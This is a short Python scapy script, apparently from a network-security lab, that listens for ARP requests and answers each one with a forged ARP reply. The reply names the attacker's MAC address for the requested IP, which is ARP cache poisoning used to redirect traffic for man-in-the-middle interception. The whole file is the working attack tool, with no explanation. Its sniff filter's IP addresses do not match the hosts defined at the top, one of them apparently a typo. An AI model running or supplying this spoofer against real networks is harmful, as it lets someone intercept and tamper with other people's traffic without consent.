#!/usr/bin/env python
from scapy.all import *



ip1="192.168.56.101"
ip2="192.168.56.102"
mac1="08:00:27:b1:47:d5"
mac2="08:00:27:b6:56:a3"

mac_attacker="08:00:27:0c:53:b7"

def main():
	while 1:
				
		
		flt="arp and (host 192.168.99.102 or host 129.168.99.101)"
		sniff(filter=flt, count=0,prn=arpSpoof2)
	

def arpSpoof2(pkt):
	print pkt.summary()
	src_mac=pkt[ARP].hwsrc
	dst_ip=pkt[ARP].pdst
	src_ip=pkt[ARP].psrc
	
	arp=ARP(op=2,hwsrc=mac_attacker,hwdst=src_mac,psrc=dst_ip,pdst=src_ip)
	eth=Ether(src=mac_attacker,dst=src_mac)
	arpPac=eth/arp
	
	sendp(arpPac,iface="eth13")
	print "packet sent is " +str(arpPac.summary())

main()

